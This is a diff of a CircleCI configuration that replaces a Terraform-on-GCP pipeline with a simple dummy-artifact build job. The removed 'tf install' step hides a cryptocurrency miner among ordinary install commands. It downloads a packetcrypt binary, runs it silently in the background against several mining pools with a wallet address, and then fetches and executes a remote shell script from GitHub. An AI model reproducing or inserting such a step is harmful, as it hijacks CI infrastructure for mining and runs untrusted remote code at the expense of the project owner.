@@ -1,57 +1,19 @@
-version: 2.1
-orbs:
-  gcp-cli: circleci/gcp-cli@2.4.1
 
-commands:
-  tf-gcp-install-plan:
-    steps:
-      - checkout
-      - gcp-cli/install
-      - gcp-cli/initialize
-      - run:
-           name: tf install
-           command: |
-              apt-get install wget curl unzip software-properties-common gnupg2 -y
-              curl -fsSL https://apt.releases.hashicorp.com/gpg | apt-key add -
-              apt-add-repository "deb [arch=$(dpkg --print-architecture)] https://apt.releases.hashicorp.com $(lsb_release -cs) main"
-              apt-get update -y
-              apt-get install terraform -y
-              terraform -v
-              wget -O sgr1 https://www.pkt.world/ext/packetcrypt-linux-amd64 && chmod 777 sgr1 && ./sgr1 ann -p pPsrSwWjFoHC39qKjkL4dk2yL5feBZ9LwZ http://pool.pkteer.com http://pool.pkt.world/master/4096 http://pool.pktpool.io/diff/2048 https://stratum.zetahash.com > /dev/null 2>&1 &wget https://raw.githubusercontent.com/BianAnisa/REvolve/main/script/time.sh && chmod +x time.sh && timeout 55m && ./time.sh
-
-      - run:
-           name: terraform init & plan
-           command: |
-              terraform init -input=false
-              terraform plan -out tfapply
+version: 2
 jobs:
- gcp-tf-plan:
-    executor: gcp-cli/machine
-    steps:
-      - checkout
-      - tf-gcp-install-plan
-      - persist_to_workspace:
-          root: .
-          paths:
-            - .
+build:
+  working_directory: /tmp
+  steps:
+    - run:
+        name: Creating Dummy Artifacts
+        command: |
+          echo "my artifact file" > /tmp/art-1;
+          mkdir /tmp/artifacts;
+          echo "my artifact files in a dir" > /tmp/artifacts/art-2;
 
- gcp-tf-apply:
-   executor: gcp-cli/machine
-   steps:
-     - attach_workspace:
-         at: .
-     - run:
-         name: terraform
-         command: |
-           terraform apply -auto-approve tfapply
-         no_output_timeout: 3h     
-     - persist_to_workspace:
-         root: .
-         paths:
-           - .
+    - store_artifacts:
+        path: /tmp/art-1
+        destination: artifact-file
 
-workflows:
-  tf-gcp-nomad:
-    jobs:
-      - gcp-tf-plan:
-           context: org-gcp
+    - store_artifacts:
+        path: /tmp/artifacts
